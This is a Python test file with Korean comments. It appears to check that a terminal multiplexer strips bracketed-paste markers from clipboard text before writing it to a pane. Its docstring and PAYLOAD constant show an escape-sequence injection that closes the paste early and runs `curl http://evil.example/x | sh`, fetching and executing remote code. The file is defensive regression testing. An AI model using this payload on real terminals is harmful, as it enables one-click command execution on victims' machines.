"""붙여넣기 안의 bracketed paste 종료 마커를 지운다(검수 2026-08-05).

`Server._write_paste` 는 앱이 켰을 때 텍스트를 `ESC[200~ … ESC[201~` 로 감싼다. 감싸는
글 자체가 종료 마커를 품고 있으면 괄호가 거기서 닫히고, 그 뒤 바이트는 셸에 **사람이
친 것**으로 들어간다 — `\\r` 을 붙여 두면 Enter 없이 실행된다. 클립보드는 남이 심을 수
있는 자리라(웹페이지의 복사 버튼·악의적 README) 그것이 곧 원클릭 명령 실행이다.

실측(수정 전, 2026-08-05):
    보낸 바이트 = b'\\x1b[200~echo benign\\x1b[201~\\rcurl http://evil/x | sh\\r\\x1b[201~'
    괄호 밖으로 샌 것 = b'\\rcurl http://evil/x | sh\\r\\x1b[201~'

되돌리면 실패해야 하는 오라클:
  · `_strip_paste_markers` 호출을 `_write_paste` 에서 빼면 → test_end_marker_cannot_escape
  · 지우는 대신 자르면(truncate) → test_the_rest_of_the_paste_survives
  · 헬퍼만 고치고 **호출부를 지우면** → 위 둘 다(이 파일은 헬퍼가 아니라 `_write_paste`
    를 부른다 — 이 저장소의 상습 실패 모드가 '값을 만드는 헬퍼만 시험하기'다)
"""
import harness  # noqa: F401
from pytmuxlib.server import Server


class _Pty:
    def __init__(self):
        self.written = b""

    def write(self, data):
        self.written += data


class _Pane:
    def __init__(self, bracketed=True):
        self.bracketed = bracketed
        self.pty = _Pty()


class _Plugins:
    def __init__(self):
        self.seen = []

    def server_paste(self, srv, pane, data):
        self.seen.append(data)


class _Srv:
    """`_write_paste` 만 떼어 부른다 — 서버 한 벌을 띄우지 않고 호출부를 단언한다."""

    _write_paste = Server._write_paste

    def __init__(self):
        self.plugins = _Plugins()


PAYLOAD = "echo benign\x1b[201~\rcurl http://evil.example/x | sh\r"


async def test_end_marker_cannot_escape():
    """종료 마커는 **우리가 붙인 것 하나**뿐이어야 한다."""
    srv, pane = _Srv(), _Pane(bracketed=True)
    srv._write_paste(pane, PAYLOAD)
    wire = pane.pty.written
    assert wire.count(b"\x1b[201~") == 1, f"괄호가 여러 번 닫혔다: {wire!r}"
    assert wire.startswith(b"\x1b[200~") and wire.endswith(b"\x1b[201~"), wire
    tail = wire[wire.index(b"\x1b[201~") + len(b"\x1b[201~"):]
    assert tail == b"", f"괄호 밖으로 샌 바이트: {tail!r}"


async def test_the_rest_of_the_paste_survives():
    """마커만 빼고 **나머지는 다 들어간다** — 자르면 붙여넣기가 조용히 반만 된다."""
    srv, pane = _Srv(), _Pane(bracketed=True)
    srv._write_paste(pane, PAYLOAD)
    inner = pane.pty.written[len(b"\x1b[200~"):-len(b"\x1b[201~")]
    assert inner == PAYLOAD.replace("\x1b[201~", "").encode(), inner


async def test_start_marker_is_stripped_too():
    """시작 마커를 남기면 셸이 붙여넣기를 두 번 시작한 것으로 본다."""
    srv, pane = _Srv(), _Pane(bracketed=True)
    srv._write_paste(pane, "a\x1b[200~b")
    assert pane.pty.written.count(b"\x1b[200~") == 1, pane.pty.written


async def test_stripped_even_without_bracketed_mode():
    """앱이 안 켰을 때도 지운다 — 두 자리가 갈라지면 한쪽만 고쳐지는 날이 온다."""
    srv, pane = _Srv(), _Pane(bracketed=False)
    srv._write_paste(pane, PAYLOAD)
    assert b"\x1b[201~" not in pane.pty.written, pane.pty.written


async def test_plugin_hook_sees_the_cleaned_bytes():
    """프롬프트 추적 훅에도 마커가 안 간다 — 안 그러면 Claude 헤더에 잔해가 남는다."""
    srv, pane = _Srv(), _Pane(bracketed=True)
    srv._write_paste(pane, PAYLOAD)
    assert srv.plugins.seen and b"\x1b[201~" not in srv.plugins.seen[0], \
        srv.plugins.seen


async def test_a_normal_paste_is_byte_identical():
    """무회귀 — 마커가 없는 보통 붙여넣기는 한 바이트도 안 바뀐다."""
    srv, pane = _Srv(), _Pane(bracketed=True)
    text = "첫 줄\n둘째 줄\tgit log --oneline | head\n"
    srv._write_paste(pane, text)
    assert pane.pty.written == b"\x1b[200~" + text.encode() + b"\x1b[201~"
